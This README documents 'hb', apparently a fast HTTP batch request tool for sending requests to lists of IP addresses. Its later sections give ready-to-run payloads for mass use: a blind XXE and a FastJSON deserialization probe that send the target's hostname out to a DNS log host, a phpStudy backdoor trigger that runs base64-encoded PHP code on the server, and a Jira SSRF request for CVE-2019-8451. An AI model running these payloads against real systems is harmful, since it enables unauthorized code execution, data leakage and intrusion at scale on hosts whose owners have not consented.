# hb
> Fast http batch request tool 

## Example 

### Load File Target
```
./hb -f ips.txt -p 80
```

### Add HTTP Header
```bash
-H "Host: bypasscdn"
```

### Show ProgressBar
```bash
-pg
```

### Follow redirect (30x)
```bash
-redirect
```

### Filter Response Body
```bash
-grep "admin"
```

### Filter Response Header (X-Powered-By ContentType Title)
```bash
-filter "nginx"
```

### Filter Response Status Code
```bash
-code 2 # 2xx
```

### Show Resposne Body 
```bash
-response
```

### Shuffle Request
```bash
-random
```

### Send Post Request
```bash
-body "a=1&b=2&c=2"

# post body from file
-bodyfile ./exploit
```

### Send PUT Request
```bash
-method PUT
```

### Show Request Error
```
-debug 
```

---

### Elasticsearch
```bash
-p 9200 -path "/_cat" -grep "/_cat/allocation"
```

### PHPINF0
```bash
-path /phpinfo.php -code 2 -grep 'PHP Version' -regexp 'PHP Version(.*?)<'
```

### XXE Blind
```bash
-body '<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY remote SYSTEM "http://{{hostname}}.dnslog/">]><x>&remote;</x>' -replace
```

### FastJSON Blind
```bash
-H "Content-Type: application/json" -body '{"@type": "java.net.InetAddress", "val":"{{hostname}}.dnslog"}' -replace -redirect
```

### Weblogic fingerprint
```bash
-p 7001 -H "Authorization: Basic" -code 401
```

### phpStudy Backdoor
```bash
-H "Accept-Charset: cGhwaW5mbygpOwo=" -H "Accept-Encoding: gzip,deflate" -grep 'PHP Version' -regexp '<tr><td class="e">disable_functions</td><td class="v">(.*?)</td>' -redirect
```

### CVE-2019-8451 Jira SSRF
```bash
-path "/plugins/servlet/gadgets/makeRequest?url={{scheme}}://{{host}}@baidu.com/" -H "X-Atlassian-Token: no-check" -replace -grep "www.baidu.com" -regexp '<meta name="ajs-version-number" content="(.*?)">' -redirect
```


